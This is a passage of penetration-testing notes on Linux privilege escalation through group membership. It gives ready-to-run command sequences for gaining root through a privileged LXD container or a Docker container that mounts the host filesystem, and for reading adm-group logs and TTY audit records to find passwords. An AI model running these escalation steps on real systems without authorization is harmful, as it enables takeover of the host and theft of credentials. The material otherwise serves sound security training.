### LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.
```bash
devops@NIX02:~$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

```bash
unzip alpine.zip 
```

```bash
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
```

### Docker
```bash
docker ps
docker run -v /:/mnt --rm -it bash chroot /mnt sh
docker-inspect {{.Config}} <id>
```

### Disk
[This article](https://www.hackingarticles.in/disk-group-privilege-escalation/) :D

### ADM
The adm group is used in Linux for system monitoring tasks. Members of this group can read many log files in `/var/log`, and can use xconsole. Other users cron jobs can be viewed

This could be exploited as confidential information such as user passwords can sometimes end up in certain application or system logs.

```bash
find /var/log/ -group adm
```

```bash
aureport --tty | less
```